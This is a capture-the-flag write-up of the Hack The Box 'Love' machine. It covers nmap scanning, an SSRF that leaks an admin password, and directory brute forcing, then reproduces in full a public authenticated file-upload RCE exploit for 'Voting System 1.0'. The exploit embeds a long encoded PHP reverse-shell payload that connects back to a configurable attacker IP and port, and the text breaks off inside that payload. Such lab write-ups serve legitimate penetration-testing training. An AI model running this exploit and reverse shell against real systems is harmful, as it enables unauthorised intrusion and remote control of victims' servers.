---
layout: post
title:  "Hack The Box - Love - Writeup"
date:   2022-04-30 07:00:00 +0200
#mainTags: ["Hack The Box","OSCP"]
tags: ["AlwaysInstallElevated","Exploit-DB","Hack The Box","Hack The Box - Easy","Hack The Box - Windows","Msfvenom","OSCP","PowerShell","Python3","SSRF","Windows Registry"]
---
{% assign imgDir="2022-04-30-HTB-Love-Writeup" %}

# Introduction
The hack the box machine "Love" is an easy machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about web enumeration, SSRF vulnerabilities, exploit identification, the Windows Registry and the AlwaysInstallElevated policy. Albeit being rated as easy, this machine requires several exploitation steps before remote code execution can be achieved, which is somewhat unusual for easy machines.

<img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">

By enumerating the target, it is possible to discover multiple web applications. Two of these communicates over HTTPS which uses SSL certificates. By inspecting one of these certificates, it is possible to leak two hostnames of the target host. One of the hostnames leads to a web application which has an SSRF vulnerability. By abusing this vulnerabilty, it is then possible to access an internal web application which leaks the admin user's password. 

The admin user's password can then be used to authenticate as the admin user to a "Voting System" web application. Once authenticated, an [authenticated RCE exploit](https://www.exploit-db.com/exploits/49445) can be used to obtain RCE as an unprivileged user. By querying the Windows Registry, it can then be discovered that this user can install MSI files as the `SYSTEM` user. A malicious MSI file can then be crafted and installed to compromise the `SYSTEM` account.

# Exploitation
We start by performing an nmap scan by executing `sudo nmap -sS -sC -sV --min-rate 10000 -p- 10.10.10.239`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `--min-rate` flag ensures that we are sending atleast 10000 packets per second to avoid long scanning times at a potential cost of reliability in the results. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that a lot of ports are open and that we are dealing with a Windows machine.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@sudo nmap -sS -sC -sV --min-rate 10000 -p- 10.10.10.239@@
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-13 08:13 EDT
Warning: 10.10.10.239 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.239
Host is up (0.18s latency).
Not shown: 64889 closed tcp ports (reset), 627 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
@@@80/tcp    open  http@@@         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
@@@443/tcp   open  ssl/http@@@     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-title: 400 Bad Request
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '10.10.16.4' is not allowed to connect to this MariaDB server
@@@5000/tcp  open  http@@@         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
@@@5985/tcp  open  http@@@         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
@@@5986/tcp  open  ssl/http@@@     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2022-04-13T12:39:08+00:00; +21m33s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
@@@47001/tcp open  http@@@         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=4/13%Time=6256BE9A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLines,
SF:49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetRequest,49,"E
SF:\0\0\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,49,"E\0\0
SF:\x01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20c
SF:onnect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequest,49,"E\0\0\x01
SF:\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20conne
SF:ct\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,49,"E\0\0\x01\xffj\x
SF:04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20t
SF:o\x20this\x20MariaDB\x20server")%r(DNSVersionBindReqTCP,49,"E\0\0\x01\x
SF:ffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect
SF:\x20to\x20this\x20MariaDB\x20server")%r(DNSStatusRequestTCP,49,"E\0\0\x
SF:01\xffj\x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20con
SF:nect\x20to\x20this\x20MariaDB\x20server")%r(Help,49,"E\0\0\x01\xffj\x04
SF:Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\
SF:x20this\x20MariaDB\x20server")%r(SSLSessionReq,49,"E\0\0\x01\xffj\x04Ho
SF:st\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x2
SF:0this\x20MariaDB\x20server")%r(TerminalServerCookie,49,"E\0\0\x01\xffj\
SF:x04Host\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20
SF:to\x20this\x20MariaDB\x20server")%r(Kerberos,49,"E\0\0\x01\xffj\x04Host
SF:\x20'10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t
SF:his\x20MariaDB\x20server")%r(SMBProgNeg,49,"E\0\0\x01\xffj\x04Host\x20'
SF:10\.10\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x
SF:20MariaDB\x20server")%r(X11Probe,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\
SF:.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Maria
SF:DB\x20server")%r(FourOhFourRequest,49,"E\0\0\x01\xffj\x04Host\x20'10\.1
SF:0\.16\.4'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20Mar
SF:iaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m35s, deviation: 3h30m06s, median: 21m32s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-04-13T12:38:51
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-04-13T05:38:52-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.48 seconds
{% endhighlight %}

We see web servers at the ports 80, 443, 5000, 5985, 5986 and 47001. Web servers are usually a good starting point during pentests since they can contain custom web applications with multiple vulnerabilties or host old web applications which have known vulnerabilties. We can start by checking out the web applications which are reachable over HTTP. In other words, the ports 80, 5000, 5985 and 47001. Visiting these ports in a browser results in a `200 OK`, `403 Forbidden`, `404 Not Found` and `404 Not Found` respectively. 

![port80](/assets/{{ imgDir }}/port80.png)

![port5000](/assets/{{ imgDir }}/port5000.png)

![port5985](/assets/{{ imgDir }}/port5985.png)

![port47001](/assets/{{ imgDir }}/port47001.png)

The login prompt at port 80, does not appear to offer any possibility for us to register an account that we could use to log in. Before proceeding with any more enumeration of these web servers, we could check out the web servers which communicate over HTTPS on port 443 and 5986. If we navigate to port 443 in Firefox, we get the self signed certificate warning below. 

![SelfSigned](/assets/{{ imgDir }}/SelfSigned.png)

If we press `Advanced...` followed by `View Certificate`, we can display more information about the certificate. This information tells us that the two domain names `stage.love.htb` and `love.htb` correspond to the target host.

![domainName](/assets/{{ imgDir }}/domainName.png)

We can add these to our `/etc/hosts` file as demonstrated below. This ensures that `love.htb` and `staging.love.htb` resolves to the IP address of the target host.

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@echo '10.10.10.239 love.htb staging.love.htb' | sudo tee -a /etc/hosts@@
10.10.10.239 love.htb staging.love.htb
                                                                                                                    
┌──(kali㉿kali)-[/tmp/x]
└─$ 
{% endhighlight %}

Next, we can try to navigate to `love.htb` and `staging.love.htb` on port 80, 5000, 5985, and 47001 to see if this results in different responses than those we saw earlier. Upon doing this, we discover a file scanning service at [http://staging.love.htb](http://staging.love.htb). This service appears to be under construction and offers a form for receiving email updates on the development progress. In addition, this page includes two buttons in the top-left corner. 

![staging.love.htb](/assets/{{ imgDir }}/staging.love.htb.png)

The `Home` button leads to the current page while the `Demo` button leads to the page below. This page can be used to scan files on the internet by referencing them with a URL.

![betaPHP](/assets/{{ imgDir }}/betaPHP.png)

We can check if it works by requesting it to scan a file on our host and see if we receive any web requests from the target host. To do this, we start a netcat listener on port 80 and submit the URL `http://[IP]/x` where `[IP]` is the IP address of our network interface which corresponds to the VPN connection.

![scanMe](/assets/{{ imgDir }}/scanMe.png)

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@sudo nc -lvp 80@@
listening on [any] 80 ...
@@@connect to [10.10.16.4] from love.htb [10.10.10.239]@@@ 62954
GET /x HTTP/1.1
Host: 10.10.16.4
Accept: */*

{% endhighlight %}

Shortly after submitting the URL, the target connects back to us on port 80 asking for the file, as shown above. This means that we have a Server Side Request Forgery (SSRF) vulnerability. This type of vulnerabilties can be useful since they can enable us to communicate with hosts and ports which only the vulnerable host can access.

We could try to use the SSRF vulnerability to access the web application running on port 5000 which gave us a `403 Forbidden` error earlier. This web application wasn't accessible from another host but it might be accessible for requests originating from the target host itself. We can try this by submitting the URL [http://localhost:5000](http://localhost:5000). Upon doing this, we discover that the web application did not reject us. Instead, it provides us with the string `@LoveIsInTheAir!!!!` which is the password of to the admin account.

![adminCreds](/assets/{{ imgDir }}/adminCreds.png)

However, attempting to log in with this password and common admin usernames at the login form we discovered earlier, does not appear to work. 

![attemptLogin](/assets/{{ imgDir }}/attemptLogin.png)

There are two likely reasons for our authentication failues. Either, we have the wrong username or we are at the wrong login page as it is common to have a separate login page for administrative users. We can search for an admin login page by using a directory brute forcing tool such as [ffuf](https://github.com/ffuf/ffuf). Note that we use a lowercase wordlist since we are dealing with a PHP application which means that routing is based on file paths and that Windows file paths are case insensitive. Using a lowercase wordlist rather than a case-sensitive wordlist could thus be faster.

<!--
Windows host + file path routing in php => Lowercase wordlist
{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ ls -lhS /usr/share/seclists/Discovery/Web-Content/ | grep "lowercase"                            
-rw-r--r-- 1 root root   13M Jan 31 18:23 directory-list-lowercase-2.3-big.txt
-rw-r--r-- 1 root root  1.8M Jan 31 18:23 directory-list-lowercase-2.3-medium.txt
-rw-r--r-- 1 root root  937K Jan 31 18:23 raft-large-words-lowercase.txt
-rw-r--r-- 1 root root  661K Jan 31 18:23 directory-list-lowercase-2.3-small.txt
-rw-r--r-- 1 root root  483K Jan 31 18:23 raft-large-directories-lowercase.txt
-rw-r--r-- 1 root root  460K Jan 31 18:23 raft-medium-words-lowercase.txt
-rw-r--r-- 1 root root  460K Jan 31 18:23 raft-large-files-lowercase.txt
-rw-r--r-- 1 root root  305K Jan 31 18:23 raft-small-words-lowercase.txt
-rw-r--r-- 1 root root  220K Jan 31 18:23 raft-medium-directories-lowercase.txt
-rw-r--r-- 1 root root  208K Jan 31 18:23 raft-medium-files-lowercase.txt
-rw-r--r-- 1 root root  143K Jan 31 18:23 raft-small-directories-lowercase.txt
-rw-r--r-- 1 root root  138K Jan 31 18:23 raft-small-files-lowercase.txt
-rw-r--r-- 1 root root   20K Jan 31 18:23 raft-large-extensions-lowercase.txt
-rw-r--r-- 1 root root  9.4K Jan 31 18:23 raft-medium-extensions-lowercase.txt
-rw-r--r-- 1 root root  6.9K Jan 31 18:23 raft-small-extensions-lowercase.txt
                            
┌──(kali㉿kali)-[/tmp/x]
└─$
{% endhighlight %}
-->

{% highlight none linenos %}
┌──(kali㉿kali)-[~]
└─$ @@ffuf -u http://love.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt@@

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://love.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

images                  [Status: 301, Size: 330, Words: 22, Lines: 10]
includes                [Status: 301, Size: 332, Words: 22, Lines: 10]
@@@admin@@@                   [Status: @@@301@@@, Size: 329, Words: 22, Lines: 10]
plugins                 [Status: 301, Size: 331, Words: 22, Lines: 10]
webalizer               [Status: 403, Size: 298, Words: 22, Lines: 10]
phpmyadmin              [Status: 403, Size: 298, Words: 22, Lines: 10]
dist                    [Status: 301, Size: 328, Words: 22, Lines: 10]
tcpdf                   [Status: 301, Size: 329, Words: 22, Lines: 10]
licenses                [Status: 403, Size: 417, Words: 37, Lines: 12]
server-status           [Status: 403, Size: 417, Words: 37, Lines: 12]
                        [Status: 200, Size: 4388, Words: 654, Lines: 126]
con                     [Status: 403, Size: 298, Words: 22, Lines: 10]
aux                     [Status: 403, Size: 298, Words: 22, Lines: 10]
:: Progress: [17770/17770] :: Job [1/1] :: 959 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
{% endhighlight %}

From the results, we discover the endpoint `/admin`. Navigating to this endpoint in a browser results in an identical login prompt to the one we saw earlier. However, if we attempt to authenticate with the credentials we tried earlier, we are successfully logged in as a user named "Neovic Devierte".

![attemptLoginAdmin](/assets/{{ imgDir }}/attemptLoginAdmin.png)

![logInOK](/assets/{{ imgDir }}/logInOK.png)

{% highlight none linenos %}
┌──(kali㉿kali)-[/tmp/x]
└─$ @@searchsploit "voting system RCE"@@
-------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                  |  Path
-------------------------------------------------------------------------------- ---------------------------------
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution | php/webapps/50088.py
@@@Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)@@@       | @@@php/webapps/49445.py@@@
-------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                  
┌──(kali㉿kali)-[/tmp/x]
└─$ @@searchsploit -p 49445@@       
  Exploit: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
      URL: https://www.exploit-db.com/exploits/49445
     Path: /usr/share/exploitdb/exploits/php/webapps/49445.py
File Type: Python script, ASCII text executable, with very long lines (6002)

@@@Copied EDB-ID #49445's path to the clipboard@@@
                                                                                                                  
┌──(kali㉿kali)-[/tmp/x]
└─$ @@cp /usr/share/exploitdb/exploits/php/webapps/49445.py ./exploit.py@@
{% endhighlight %}

We can search for known exploits for this web application using searchsploit. Upon doing this, we find an [authenticated remote code execution exploit](https://www.exploit-db.com/exploits/49445) for version 1.0 of a PHP web application named "Voting System". We copy this exploit to a file named "exploit.py" in the current directory. The full exploit is shown below.

{% highlight python linenos %}
# Exploit Title: Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)
# Date: 19/01/2021
# Exploit Author: Richard Jones
# Vendor Homepage:https://www.sourcecodester.com/php/12306/voting-system-using-php.html
# Software Link: https://www.sourcecodester.com/download-code?nid=12306&title=Voting+System+using+PHP%2FMySQLi+with+Source+Code
# Version: 1.0
# Tested on: Windows 10 2004 + XAMPP 7.4.4

import requests

# --- Edit your settings here ----
IP = "192.168.1.207" # Website's URL
USERNAME = "potter" #Auth username
PASSWORD = "password" # Auth Password
REV_IP = "192.168.1.207" # Reverse shell IP
REV_PORT = "8888" # Reverse port
# --------------------------------

INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"

payload = """

<?php

header('Content-type: text/plain');
$ip   = "IIPP";
$port = "PPOORRTT";
$payload = "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